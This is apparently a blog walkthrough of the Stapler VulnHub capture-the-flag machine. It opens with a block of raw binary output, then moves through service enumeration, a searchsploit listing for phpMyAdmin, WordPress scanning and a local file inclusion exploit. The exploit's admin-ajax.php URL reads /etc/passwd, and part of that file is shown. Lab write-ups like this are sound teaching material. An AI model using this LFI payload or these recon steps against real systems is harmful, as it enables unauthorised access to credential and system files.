                           2_�.x2ܜ���H7���8�/�Le����0����$�U�\[��v�E?WV�~�ӑ���z���P5�i�a�"Ѥ���E�����e4����VK}����*����S"�4�C1���7�:V�o���g�S]u�#�k"�;��MrQRx1y]�C$���w��U�nR5����G���mWA��~�_^0Rkf��WS�Û�0��^u�I�?=�C{��1��m y���̢��M�7�랧�ښV0��ok��j)>���<:�$��&9y�#�kb�O']B2b�#�hY�A���\��)Yo���tixye��
                                                  ȉA;{e��z��
                                                            ���P�s��۽@��K��݃��ՆJ�v�g����wTJ�6;.,�縅�)f����jϛ�*�.8�Q�S�dyLw�4��#2�[��ኈ{�>�n�N�%�z��Uj�����XA�D׫h7��)'��V�p�L��l��1��0u��6���qB��_�PI9�'$W�@R��       %���4v[0�֫��2D�|���1�o$��C�_Vk��"}�<��t�pGwv/�DrN�Z�S��|��w�ۄ%���e7�L�ڱB�Cbܲ�c�i�d�M�
            �����pn+p�����@3�P���m6�k��Z1 bd�XG*4�D�qBӞ3�VGϾgc��x6��i�o���Z%fC��w��qk�S�C�&�QJ����c
3������+1*p�Z8���kYAv���7�
             v��7���f���9���lRopG���?J���<��XK[fm4~01��]:?O�
��Y��̆_#�ڬ�>c�>8�)�ם HuB�k���. uq}|����q�9~fM�ᦒ���<����%�PQ��Uܗ���l�%�:�gbJ8�8x��!�l��ó�A_]F��K�9b�n}�
                                                                                                     ��
                                                                                                       ��8�P�
                                                                                                             �
�>R=Z��%�X5�3ԇ]�S�V��`E�ڿU��Ɣ45��S�4�D�А��L���d)=;Ms_���]H�NQ,�$j
��"�~[�e
{�.�e.�=l b��:�����7�=
                      4�1]M�.:X����Z�*�J
                                        �zW���D�S��
%����y�,A� ��=L<��0I��GG��ߞ5
                           ��Q"&{T��}u4�{�2c�������+~����aߧ�I�c��L����mL���|S��/�i-
�f�J�P��{4���e��W���>ȸڛ�\��1��^��@*�,�B莗���U�[q�&��                               %��~�Z�E�f
                                                    �QƱ���k��Ĩ1\k-J
�+�����fq��c"\��        ���zM$�o��C�����*G�����/R����ܾ.�t��z�
        ��F��I������"�
                      >Jv������9�R
5`R��t���^�[�>���d��Qx�4GR�i�%��֓��hxn���&j^`���R��G�NR��%j�]�i^L��eL�tB����KT��D�z� 7��WwBn
�3o#�9�gٺ�)w�� ն�Pi HQT͏5��K���P���;S��:��;[n�xKt��xU��Ǖ����L����Et@lڎ.j���H���"��V+f���4QO��)tB�����=}�q#�r�%t!c\֋O�7X��Ղr��dy"�Ə���s�s�T�p�D��5�݌k)IY�����`t0���/Z����٤e�&���&�->��$kl߁X���ʤϗr�w���T�ǜt�M����9�lxKo;ĸ$��Qa}L�\ ck�
                                                                                                        �قi
                                                                                                           i`o#��$>V1_\���'�2���C�\�����c۪r�T.'ldʽ+��@n���_\ıU8������6����6ƶWU�
�8n�I��S�cr&,z�-�ˠ٫��I��SgTSa�SGN���)j4
L��!��|�RaOmK�&���q;F�
���@lG>-5�m�

�>n�%}<8    �!����a�d��ɣ������f�J]ZI�A���k�����g}]v�t#�"�&��]̘�Z�$�g�'b�P�
/�]R*��dx;\��)=��E���   �,��Q_�<S��Y��(�        ���W�Z>]C�&��7����~�d����W+�2��v.h�2;��hYݥ�3͊�P�����X]M[��y��L�U��V}�8�f�,�ge���|Ǐ-��
Z�!o�
     a �l���($��$�L�Mǳ���=��7�Z�g'Dٍ�ڽo�I�v���.HJ�nb��7���ןK4��bS���H��+�c��
                                                                           Y�9�\�($����
���%�   _�Ķ�i�RF��S�IG{���COy�(�H�����,���g��r�WC��ϰz��ea�xj����Z�B]Z�dS[�uX�}�P{fQ�ҏ�_�,�Nh��{�;}_41�d"���"��"
ѕ�N��:��)}���ek���ڙat�A��{�"۹�                                                                                 ���V��GO�+
��ז�����d�&~�O��r��<�Я��2��p���D�{g���C0z�]�e
                                             ������Aќ^uls%����
                                                              ��u|�ж�������g�wi�T��;�   U�,i?ѝ�X���
�����zP�(/Bfu��9X�@�|S"2�'�`���S��`]K��%�ȉ�'Z�"p�A�)�����T�Ym��8s
��^aQ�������<B��G�Z�۷hp+[2ɕ����'�*��ѵJ��+X Rラ�l5�%,}O�pO
                                                         ������4[|�6���d�,
LQ��=��9zf�-��W��~¤Ec����q)�Wվ����I�m��*�и�m�1p��A ��l�<I��VQk�<ҭ��H0g�Ě,���[�J���g������E|�hR�/��n�E51�K����s���Y���
                                                                                                                     �z�A����X7i�dQs�������c�n�KHQ��Ϗ&����A��N���#6+=����
                                              �9�
                                                 �v���T�
{x��D8B�R�1u���A���������2ڇ�{_
                              6 8cwԻ90�
#Oʉ:so���X��                           |ho�'3��8��w�q͵T�ߡ0��(7*�<
            �loƎ3��ȏ%���P�kՌє�'�H�      47���RzDK��Q��`�����#1�����R*��9���7w�'�f�.�_cb�ŗV��kS`l�Cw��v�����1�z�27
                                                                                                                 ����r��s[�����T8q���@��gl�z�&?��+�x킀�y��R�҅M�42���k�3O�$�Cw�^�D~����n?'���4�WW9!�K�+Ɏ{Z�?��2j�,�G�}B�硹WQO��|LM'��\tY-c��9�5��_�n{|��JX�Co�9��@S��{#~;�t������=W.��x=�sV�N�~=�L�V�eR�c��8�F
                                                      l�×��D"��;�G�|��1�������F|��M���sɹ����ߍ�q�~�Ʉ����j�P[A�}%�ifx:5�`忎�M5'n2�K�D����G�S�cHA/�HT�I��֮�7�%��4�It@F//KU��h�G*���5�M�~[���:J�b�!:mnu�����>$�^���?b2c��N�ؔ����R����EF����-���4�I�VK���]�И����<Q�μ!QwE���U{D�
                  ��e��l���|�J5����f$X�JC�*�K�~�<�d>��#��DvY��1d2��'�
`�                                                                   _�t�#ә�s���;uq�m�
�E�8K���ɞ�
          ��5Nhz        ccc�

                            �\S�
�OX�3��ɬG(��~����r0*u�85_��M���к
2��%\����T�>�r�\f�ey~ػ����cƛ�Fy浑�jG��ٱ>�gKk��/�G4����|@�s�B怊�ʅ����}�_�)I��=˂Ș�=����7����~��9U7�k������W�����C3�
                                                ���z�ѫ�d�F�Na73R�%9'���[�l&Z*�K��r�P���T�Ɗ��:�~U�!Ц���
                                                                                                      T�
                                                                                                        |��II��Pqw��,�a
                                                                                                                       �Ŕ�L6��E�F�n$�'J���c���`�D�+TVM_��{�
$��-[12F�Ժ�     ��W�9c���r�)���9�yb��%�����ͬR���ۣ�N̽�f��_��9�;*�TwF�O�b
"�O�c��F��uU�lg�3�ǃeQX4��:��nYư�q�@%������F�V. }ڄ~s?է�:�Sk�d(_L���ᄾ8������єI��~��N��rNA�7���6�
                                                                                               �sU>S�b�j"�� g���k� ��UM�OE��8���ť��%#/ۙE���v�?��Kh��H��$�=��b;!(�(��e1���3��
 ���s@�i�P�ۖ�~��ż�����s���u�ьS�e��p�m�f�Fc��5jŤ?��Rsg    ?�L��yB��dS�i[$�����4\<�ݲR��0��_Yx�A|�^���d<�H��8#���
                                                                                                             *G*ͼ��@U^�?��i��1��)��?R�=��
V�=�;���Db�2��ؾ��a'��*���
                         ��$$��Ix�}��$[������8x�/0�|��poje�n�"}��3��A6�B        ]��#��{6�A�LrM,{2X��KַµB-�̪K�i���'p�^�ثu��繏�J�Du5Gs�\���D\���F��޴�զ�W3��.��V��n4�_r�,�oA��
                                              �fOl�qR���������HK�]�d=��&Rۛ�N,{}�=��R�M��t�I�/L��-}��.�-��n"%ҹ�a��^��}�2�!0�jق#�}#�g�yw��/������$�J.w�y�ʉ[e�
9<@�=��F�vi��!e:$p738�Z� �G�x��~��O�yfΟ��Q��;��i� 6FK�h�x���T�� m���
                                                                    2��j���i���4*��v�P�'|��+8 ٶ�Ѩ��oB7��2e1�na�;�H��OM8G�/�^��*I��'��<�\B#��¾���7R��ґ���"~N1�og�a��p]K��£#h�:�p���M$��a\5yo
BVQ�29fk>����/l0�^�l��
9D��4�9ɱ�Ba�XV񭃷��`�K�e%9N�r�������q�ҁ���_Pd��Hp���,2
                                                    ��message2.jpgUT+�QWux
                                                                          �PKR�,
```

Looks like binary data, lets stick it in a file and see what kind of data we have.

``` bash
nc $STAPLER_IP 666 > doom && file doom
# returns
doom: Zip archive data, at least v2.0 to extract
# a zip?!? Lets rename and unpack
mv doom doom.zip && unzip doom.zip
```

this gives us ![message2.jpg](/assets/vulnhub_stuff/stapler/message2.jpg)
``` bash
#check the jpeg for hidden stuff:
file message2.jpg 
```

returns

```
message2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 364x77, components 3
```
check for hidden strings

``` bash
strings message2.jpg > message2.txt
```
We get another potential user, scott from [message2.txt](/assets/vulnhub_stuff/stapler/message2.txt) and maybe an actual cookie? Potentially just an easter egg though.


this takes us up to 5 users:

1. fred - smb
2. kathy - smb
3. harry - ftp
4. elly - ftp
5. scott - DOOM

-----------------------------

### MySQL
Time to try mysql

``` bash
nmap -A -p 3306 $STAPLER_IP
```

gives

```
Host is up (0.0010s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, ODBCClient, InteractiveClient, SupportsTransactions, SupportsCompression, Speaks41ProtocolNew, ConnectWithDatabase, LongPassword, Support41Auth, LongColumnFlag, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x16b?Fur\x07\x06-\x1BK       "W>\x01t`]h
|_  Auth Plugin Name: 88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

I get some useful info, but nothing I can leverage immediately, I try logging in as root:

``` bash
mysql -h $STAPLER_IP -u root -p
#use toor to try
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'192.168.56.1' (using password: YES)
```
looks like dB root can log in remotely, but I have no passwords.

I could try force my hand and brute force in, I have some usernames but there are still 2 services left.

-----------------------------

### SSH
ssh is next: 

> TODO get outputs

``` bash
nmap -A -p 22 $STAPLER_IP
```
gives a pretty standard response:

```
Host is up (0.0010s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, ODBCClient, InteractiveClient, SupportsTransactions, SupportsCompression, Speaks41ProtocolNew, ConnectWithDatabase, LongPassword, Support41Auth, LongColumnFlag, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x16b?Fur\x07\x06-\x1BK       "W>\x01t`]h
|_  Auth Plugin Name: 88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
bhero@bh-t430:~/Documents/git_site/bovinehero.github.io/assets/vulnhub_stuff/stapler$ nmap -A -p 22 $STAPLER_IP
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-06 10:24 BST
Nmap scan report for 192.168.56.104
Host is up (0.00040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```

But we get barry, another user from:

``` bash
ssh root@$STAPLER_IP
```

as shown:

```
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.104' (ECDSA) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
root@192.168.56.104's password: 
```
At this point I have a decent userlist starting to appear

1. fred - smb
2. kathy - smb
3. harry - ftp
4. elly - ftp
5. scott - DOOM
6. barry - ssh

We'll park this for later, but lets take stock before we start on the http services.

We have the userlist above, we know the server is a development system based on the comments found in the services.
We know to look for a LAMP stack with Wordpress on Ubunbtu.
The MySql is open, but password protected.
FTP and Samba may offer us a potential file upload IF we can gain more leverage.

-----------------------------

### HTTP
lets check the default website

``` 
curl http://$STAPLER_IP/

```
returns a 404 page in html, no webroot? interesting could be a dead site.

``` html
<!doctype html><html><head><title>404 Not Found</title><style>
```
Lets write a nikto scan to [HTTP80.txt](/assets/vulnhub_stuff/stapler/HTTP80.txt], see what we pick up:

```
nikto -h $STAPLER_IP > HTTP80.txt 
```
Yeilds nothing of use in [HTTP80.txt](/assets/vulnhub_stuff/stapler/HTTP80.txt], lets try the other one:

```
curl http://$STAPLER_IP:12380
```
wow, lets put it in a [file](/assets/vulnhub_stuff/stapler/12380_index.txt] as the output is huge:

```
curl http://$STAPLER_IP:12380 > 12380_index.txt
```

code review gets another user __Zoe__

and a base64 encoded image:

![decoded_20190804155642.jpeg](/assets/vulnhub_stuff/stapler/decoded_20190804155642.jpeg)

the base64 encoding _might_ give us an avenue to attack later if we have trouble uploading a shell.

Doesn't appear to be any standard links within the site, lets check robots.txt to see if we have anything else to go on.

Viewing in the browser loads the index page, but the reload is strange almost a notable delay, try curl 

```
curl http://$STAPLER_IP:12380/robots.txt
```

I get the same result. Looks like I'm stuck, but I'll try nikto to a [file](/assets/vulnhub_stuff/stapler/HTTP12380.txt] again

```
nikto -h $STAPLER_IP:12380 > HTTP12380.txt
```

looking at it shows 2 hits from robots.txt:
* /admin112233/
* /blogblog/

and one from brute force:
* /phpmyadmin/

This is weird, I wonder why I keep getting a redirect. Lets try a curl for headers 

``` bash 
curl -I http://$STAPLER_IP:12380
# note the dave header!
HTTP/1.1 400 Bad Request
Date: Sun, 04 Aug 2019 22:14:55 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Fri, 03 Jun 2016 16:55:33 GMT
ETag: "6a16a-53462974b46e8"
Accept-Ranges: bytes
Content-Length: 434538
Dave: Soemthing doesn't look right here
Connection: close
Content-Type: text/html
```

lets try https

``` bash
curl https://$STAPLER_IP:12380/robots.txt
# ah ha!
curl: (60) SSL certificate problem: self signed certificate
```
force insecure ssl because YOLO

``` bash
curl https://$STAPLER_IP:12380/robots.txt -k
# works! ha!
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

lets try the sites:
``` bash
# close call!
curl https://$STAPLER_IP:12380/admin112233/ -k > admin112233.txt
# the wp site!
curl https://$STAPLER_IP:12380/blogblog/ -k > blogblog.txt
# phpmyadmin
curl https://$STAPLER_IP:12380/phpmyadmin/ -k > phpmyadmin.txt
```

[admin112233.txt](/assets/vulnhub_stuff/stapler/admin112233.txt)
[blogblog.txt](/assets/vulnhub_stuff/stapler/blogblog.txt)
[phpmyadmin.txt](/assets/vulnhub_stuff/stapler/phpmyadmin.txt)

-----------------------------

## Attack Time

Now it's time to attack!

phpmyadmin is a good value extraction if we can get access, lets check it first.

From the browser phpmyadmin site looks boilerplate. 
phpmyadmin traditionally is a good value extraction and has potential for RCE if the site is misconfigured but we need access. Older versions do have exploit paths, lets check the source code for the version.

This line, suggests we are looking at version 4.5.4.1. We can't be 100%, but the site looks like a default configuration, making this a hard sell without access.

``` html
<link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.5.4.1deb2ubuntu1" ....
```

lets see if there are any exploits:

``` bash
searchsploit phpmyadmin
```
Output confirms it, without a new exploit we're going to need authentication to make use of this.

```
--------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                               |  Path
                                                                                             | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------- ----------------------------------------
WordPress Plugin Portable phpMyAdmin - Authentication Bypass                                 | exploits/php/webapps/23356.txt
XAMPP 3.2.1 & phpMyAdmin 4.1.6 - Multiple Vulnerabilities                                    | exploits/php/webapps/32721.txt
phpMyAdmin - '/scripts/setup.php' PHP Code Injection                                         | exploits/php/webapps/8921.sh
phpMyAdmin - 'pmaPWN!' Code Injection / Remote Code Execution                                | exploits/php/webapps/8992.php
phpMyAdmin - 'preg_replace' (Authenticated) Remote Code Execution (Metasploit)               | exploits/php/remote/25136.rb
phpMyAdmin - 'tbl_gis_visualization.php' Multiple Cross-Site Scripting Vulnerabilities       | exploits/php/webapps/38440.txt
phpMyAdmin - (Authenticated) Remote Code Execution (Metasploit)                              | exploits/php/remote/45020.rb
phpMyAdmin - Client-Side Code Injection / Redirect Link Falsification                        | exploits/php/webapps/15699.txt
phpMyAdmin - Config File Code Injection (Metasploit)                                         | exploits/php/webapps/16913.rb
phpMyAdmin 2.11.1 - 'Server_Status.php' Cross-Site Scripting                                 | exploits/php/webapps/30733.txt
phpMyAdmin 2.11.1 - 'setup.php' Cross-Site Scripting                                         | exploits/php/webapps/30653.txt
phpMyAdmin 2.5.7 - Remote code Injection                                                     | exploits/php/webapps/309.c
phpMyAdmin 2.6 - 'display_tbl_links.lib.php' Multiple Cross-Site Scripting Vulnerabilities   | exploits/php/webapps/25153.txt
phpMyAdmin 2.6 - 'select_server.lib.php' Multiple Cross-Site Scripting Vulnerabilities       | exploits/php/webapps/25152.txt
phpMyAdmin 2.6 - 'theme_left.css.php' Multiple Cross-Site Scripting Vulnerabilities          | exploits/php/webapps/25154.txt
phpMyAdmin 2.6 - 'theme_right.css.php' Multiple Cross-Site Scripting Vulnerabilities         | exploits/php/webapps/25155.txt
phpMyAdmin 2.6 - Multiple Local File Inclusions                                              | exploits/php/webapps/25156.txt
phpMyAdmin 2.6.3-pl1 - Cross-Site Scripting / Full Path                                      | exploits/php/webapps/12642.txt
phpMyAdmin 2.6.4-pl1 - Directory Traversal                                                   | exploits/php/webapps/1244.pl
phpMyAdmin 2.7 - 'sql.php' Cross-Site Scripting                                              | exploits/php/webapps/27632.txt
phpMyAdmin 2.8.1 - Set_Theme Cross-Site Scripting                                            | exploits/php/webapps/27435.txt
phpMyAdmin 2.9.1 - Multiple Cross-Site Scripting Vulnerabilities                             | exploits/php/webapps/29895.txt
phpMyAdmin 2.x - 'Export.php' File Disclosure                                                | exploits/php/webapps/23640.txt
phpMyAdmin 2.x - 'db_create.php?db' Cross-Site Scripting                                     | exploits/php/webapps/29058.txt
phpMyAdmin 2.x - 'db_operations.php' Multiple Cross-Site Scripting Vulnerabilities           | exploits/php/webapps/29059.txt
phpMyAdmin 2.x - 'error.php' Cross-Site Scripting                                            | exploits/php/webapps/26199.txt
phpMyAdmin 2.x - 'queryframe.php' Cross-Site Scripting                                       | exploits/php/webapps/26392.txt
phpMyAdmin 2.x - 'querywindow.php' Multiple Cross-Site Scripting Vulnerabilities             | exploits/php/webapps/29060.txt
phpMyAdmin 2.x - 'server_databases.php' Cross-Site Scripting                                 | exploits/php/webapps/26393.txt
phpMyAdmin 2.x - 'sql.php?pos' Cross-Site Scripting                                          | exploits/php/webapps/29061.txt
phpMyAdmin 2.x - Convcharset Cross-Site Scripting                                            | exploits/php/webapps/25330.txt
phpMyAdmin 2.x - External Transformations Remote Command Execution                           | exploits/php/webapps/24817.txt
phpMyAdmin 2.x - Information Disclosure                                                      | exploits/php/webapps/22798.txt
phpMyAdmin 2.x - Multiple Script Array Handling Full Path Disclosures                        | exploits/php/webapps/29062.txt
phpMyAdmin 3.0.1 - 'pmd_pdf.php' Cross-Site Scripting                                        | exploits/php/webapps/32531.txt
phpMyAdmin 3.1.0 - Cross-Site Request Forgery / SQL Injection                                | exploits/php/webapps/7382.txt
phpMyAdmin 3.2 - 'server_databases.php' Remote Command Execution                             | exploits/php/webapps/32383.txt
phpMyAdmin 3.3.0 - 'db' Cross-Site Scripting                                                 | exploits/php/webapps/33060.txt
phpMyAdmin 3.3.x/3.4.x - Local File Inclusion via XML External Entity Injection (Metasploit) | exploits/php/webapps/18371.rb
phpMyAdmin 3.5.2.2 - 'server_sync.php' Backdoor (Metasploit)                                 | exploits/php/webapps/21834.rb
phpMyAdmin 3.5.8/4.0.0-RC2 - Multiple Vulnerabilities                                        | exploits/php/webapps/25003.txt
phpMyAdmin 3.x - Swekey Remote Code Injection                                                | exploits/php/webapps/17514.php
phpMyAdmin 4.0.x/4.1.x/4.2.x - Denial of Service                                             | exploits/php/dos/35539.txt
phpMyAdmin 4.6.2 - (Authenticated) Remote Code Execution                                     | exploits/php/webapps/40185.py
phpMyAdmin 4.7.x - Cross-Site Request Forgery                                                | exploits/php/webapps/45284.txt
phpMyAdmin 4.8 - Cross-Site Request Forgery                                                  | exploits/php/webapps/46982.txt
phpMyAdmin 4.8.0 < 4.8.0-1 - Cross-Site Request Forgery                                      | exploits/php/webapps/44496.html
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                  | exploits/php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                  | exploits/php/webapps/44928.txt
phpMyAdmin 4.8.4 - 'AllowArbitraryServer' Arbitrary File Read                                | exploits/php/webapps/46041.py
phpMyAdmin3 (pma3) - Remote Code Execution                                                   | exploits/php/webapps/17510.py
--------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result

```

Lets turn our attention to the Wordpress site, again from the source code it looks pretty standard wordpress.

Lets check if there is a default admin page: https://192.168.56.104:12380/blogblog/wp-admin

theres a bit of a redirect, lets curl it and view the headers

``` bash
curl -k https://$STAPLER_IP:12380/blogblog/wp-admin -I
```

gives us a redirect

```
HTTP/1.1 301 Moved Permanently
Date: Fri, 06 Sep 2019 10:34:21 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: https://192.168.56.104:12380/blogblog/wp-admin/
Content-Type: text/html; charset=iso-8859-1
```

lets follow

``` bash
curl -k https://$STAPLER_IP:12380/blogblog/wp-admin -IL
```

```
HTTP/1.1 301 Moved Permanently
Date: Fri, 06 Sep 2019 10:34:54 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: https://192.168.56.104:12380/blogblog/wp-admin/
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 302 Found
Date: Fri, 06 Sep 2019 10:34:54 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Pragma: no-cache
Location: https://192.168.56.104:12380/blogblog/wp-login.php?redirect_to=https%3A%2F%2F192.168.56.104%3A12380%2Fblogblog%2Fwp-admin%2F&reauth=1
Dave: Soemthing doesn't look right here
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Fri, 06 Sep 2019 10:34:54 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Pragma: no-cache
Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/blogblog/; secure
X-Frame-Options: SAMEORIGIN
Set-Cookie: wordpress_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/wp-admin
Set-Cookie: wordpress_sec_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/wp-admin
Set-Cookie: wordpress_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/wp-content/plugins
Set-Cookie: wordpress_sec_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/wp-content/plugins
Set-Cookie: wordpress_logged_in_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Set-Cookie: wordpress_logged_in_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Set-Cookie: wordpress_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Set-Cookie: wordpress_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Set-Cookie: wordpress_sec_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Set-Cookie: wordpress_sec_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Set-Cookie: wordpressuser_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Set-Cookie: wordpresspass_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Set-Cookie: wordpressuser_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Set-Cookie: wordpresspass_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
Dave: Soemthing doesn't look right here
Content-Type: text/html; charset=UTF-8
```

Some Custom headers, auth perhaps? Remember the source code from the share? 
Might be worth investigating that later if we get stuck. - Spoiler we won't

A source code audit is not my strong suit, I'll put a pin in that to revisit.
Instead lets look to WP to see if it is carrying any of its halmark weaknesses... users and plugins!

> TODO add files

first lets kick off a nikto scan:
``` bash
nikto -h https://$STAPLER_IP:12380/blogblog/ > HTTPSblogblog.txt
```

looks like a standard wp site, lets dig deeper

``` bash
# check for users using wpscan
wpscan --url https://$STAPLER_IP:12380/blogblog/ --enumerate u --disable-tls-checks -o wpscan_users.txt
```

wpscan also has a mode for checking vuln plugins, but I typically have limited success in determining _vulnerable_ plugins with this tool, we'll search for all plugins and check manually.

> TODO link file

```
wpscan --url https://$STAPLER_IP:12380/blogblog/ --enumerate ap --disable-tls-checks --plugins-detection aggressive -o wpscan_plugins.txt
```
this takes a little time, but eventually we see directory listing is available and the plugins are here ```https://192.168.56.104:12380/blogblog/wp-content/plugins/```

lets check searchsploit for the video plugin:

``` bash
searchsploit wordpress plugin video advanced
# gives us
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                         | exploits/php/webapps/39646.py
```

LFI... now we are talking!

``` bash
cp /usr/share/exploitdb/exploits/php/webapps/39646.py .
```

the PoC code in the exploit suggests that we can test the functionality with this url:
http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

if we go to ```https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/etc/passwd``` we should create a file upload with the contents of /etc/passwd.

the exploit produces a success of sorts and a url.

> TODO get outputs

Following the url we get a 404. hmmmm so what happened? 

lets take a closer look at the url parameters of the php page:
/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

the call is not directly to a plugin url, it is to admin-ajax.php from the wp-admin directory.

quick google of this returns:

`
Introduced in WordPress 3.6 the WordPress Heartbeat API allows WordPress to communicate between the web-browser and the server. It allows for improved user session management, revision tracking, and auto saving. ... The WordPress Heartbeat API uses /wp-admin/admin-ajax.php to run AJAX calls from the web-browser.
`

ok so this is not the plugin but the WP site that is calling this

Lets look at the options: action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

action=ave_publishPost - action the admin-ajax.php is going to do
title=random - filename generator for the published post
short=1 - True
term=1 - True
thumb=[FILEPATH] - this is the image that is published

looks like we are publishing a thumbnail picture via the ave_publishPost

I try to find this method by running a grep for the method in extracted version of the backup code:

```
grep -rl "ave_publishPost" .
```

I get nothing, this is unexpected. I expected the backup code to have reference to this, closer invesigation into the source code, shows the Advanced-Video-Embed plugin is not there... bummer.

This must be method specific to Advanced-Video-Embed, as it doesn't look like a standard method for WordPress.

I google the source code for this, but it looks like the plugin has been pulled.
Checking the exploit source code, gives me little more insight into what the flow is. 

## Are we stuck?

Well lets think about what the plugin goes, it allows an easy way to imbed video files. 
We are esentially creating a malformed thumb image, there must be a location where this is stored.   
The default directory for this is usually a child of wp-content.

lets go there: ``` https://192.168.56.104:12380/blogblog/wp-content/```

Ah ha! Directory listing!

![wp-content.png](/assets/vulnhub_stuff/stapler/wp-content.png)

and within uploads, what looks like a random image:

![wp-uploads.png](/assets/vulnhub_stuff/stapler/wp-uploads.png)

Trying to open in it in the browser gives us errors, but that is because the file is not actually a jpeg and the browser is expecting a jpeg, lets curl it:

``` bash
curl -k https://$STAPLER_IP:12380/blogblog/wp-content/uploads/108293608.jpeg
```

mwah hahaha! We have LFI! With the contents of the /etc/passwd we also have every system user, we can now attempt a fine scoped brute force login attempt.

```
root:x:0:0:root:/root:/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
